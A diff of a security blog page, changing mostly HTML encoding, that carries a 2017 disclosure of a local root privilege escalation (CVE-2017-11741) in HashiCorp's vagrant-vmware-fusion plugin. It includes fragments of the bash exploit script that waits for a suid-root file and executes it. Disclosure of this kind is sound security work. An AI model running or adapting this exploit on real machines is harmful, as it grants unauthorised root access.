@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,17 +23,18 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/cve201711741-local-root-privesc-in-hashicorp-vagrantvmwarefusion--4023.html">CVE-2017-11741 Local root privesc in Hashicorp vagrant-vmware-fusion <= 4.0.23</a></h2>
                 <h3>2 Aug 2017 06:49  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
-                  <pre>A couple of weeks ago I disclosed a local root privesc in Hashicorp&#39;s
+                
+                  <pre>A couple of weeks ago I disclosed a local root privesc in Hashicorp&#x27;s
 vagrant-vmware-fusion plugin:
 
-<a href="https://m4.rkw.io/blog/cve20177642-local-root-privesc-in-hashicorp-vagrantvmwarefusion--4020.html">https://m4.rkw.io/blog/cve20177642-local-root-privesc-in-hashicorp-vagrantvmw...</a>
+https://m4.rkw.io/blog/cve20177642-local-root-privesc-in-hashicorp-vagrantvmwarefusion--4020.html
 
 The initial patch they released was 4.0.21 which unfortunately contained a bug
 that prevented it from working at all on mac systems so I was unable to test it.
@@ -55,15 +56,15 @@ vagrant_vmware_desktop_sudo_helper_wrapper_linux_386
 vagrant_vmware_desktop_sudo_helper_wrapper_linux_amd64
 
 The wrapper that matches the system architecture will be made suid root the
-first time any vagrant box is up&#39;d.  When a vagrant box is started the wrapper
+first time any vagrant box is up&#x27;d.  When a vagrant box is started the wrapper
 script elevates privileges and then executes the ruby sudo helper script.
 
 Previously I exploited the unsanitised system(&quot;ruby&quot;) call to simply invoke the
 wrapper directly and execute an arbitrary fake &quot;ruby&quot; script in the current PATH.
-This is now mitigated with 4.0.22 because the wrapper refuses to execute if it&#39;s
+This is now mitigated with 4.0.22 because the wrapper refuses to execute if it&#x27;s
 not being called by vagrant.
 
-Unfortunately it&#39;s still possible to exploit it because the wrapper executes the
+Unfortunately it&#x27;s still possible to exploit it because the wrapper executes the
 sudo helper as root, and the sudo helper is not root-owned so we can overwrite it
 with any arbitrary ruby code which will then get executed as root when vagrant up
 is run.
@@ -71,11 +72,11 @@ is run.
 The issue was reported to Hashicorp on 27/07/17 and fixed on 01/08/17.
 
 This exploit requires a vmware_fusion box to be present on the system in order to
-work.  If you don&#39;t have one it may take a few minutes to download one.  Like
-last time it targets darwin 64bit but it&#39;s likely the other architectures are
+work.  If you don&#x27;t have one it may take a few minutes to download one.  Like
+last time it targets darwin 64bit but it&#x27;s likely the other architectures are
 vulnerable too.
 
-<a href="https://m4.rkw.io/vagrant_vmware_privesc_4.0.23.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_4.0.23.sh.txt</a>
+https://m4.rkw.io/vagrant_vmware_privesc_4.0.23.sh.txt
 81c2637cd1f4064c077aabc6fa7a3451ae3f2bd99c67f25c966728f88a89d5a1
 --------------------------------------------------------------------------
 #!/bin/bash
@@ -102,7 +103,7 @@ if [ -e &quot;$target&quot; ] ; then
   exit
 fi
 
-box=`vagrant box list |grep &#39;(vmware_desktop&#39; |head -n1 |cut -d &#39; &#39; -f1`
+box=`vagrant box list |grep &#x27;(vmware_desktop&#x27; |head -n1 |cut -d &#x27; &#x27; -f1`
 
 if [ &quot;$box&quot; == &quot;&quot; ] ; then
   echo &quot;No vmware_fusion boxes found locally, we will have to download one.&quot;
@@ -142,8 +143,8 @@ EOF
 chmod 755 vagrant_vmware_desktop_sudo_helper
 
 cat &gt; vagrantfile &lt;&lt;EOF
-Vagrant.configure(&#39;2&#39;) do |config|
-  config.vm.box = &#39;$box&#39;
+Vagrant.configure(&#x27;2&#x27;) do |config|
+  config.vm.box = &#x27;$box&#x27;
 end
 EOF
 
@@ -151,7 +152,7 @@ vagrant up 2&gt;/dev/null &amp;
 
 while :
 do
-  r=`ls -la $target |grep -- &#39;-rwsr-xr-x  1 root  wheel&#39;`
+  r=`ls -la $target |grep -- &#x27;-rwsr-xr-x  1 root  wheel&#x27;`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
     break
   fi
@@ -167,10 +168,11 @@ echo
 sleep 1
 cd
 $target
---------------------------------------------------------------------------</pre>
+--------------------------------------------------------------------------
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -180,39 +182,67 @@ $target
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
